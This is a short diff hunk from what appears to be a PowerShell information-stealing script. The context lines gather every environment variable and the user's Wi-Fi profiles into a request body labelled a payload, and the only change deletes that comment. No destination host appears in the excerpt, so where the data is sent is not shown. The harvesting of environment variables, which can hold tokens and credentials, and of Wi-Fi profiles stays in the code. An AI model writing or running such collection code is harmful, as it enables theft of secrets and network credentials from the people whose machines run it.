@@ -19,7 +19,6 @@ gci env:* | ForEach-Object {
   $envVars[$_.Name] = $_.Value
 }
 
-# Construct the payload
 $Body = @{
   'username' = $env:username
   'wifi_profiles' = $wifis
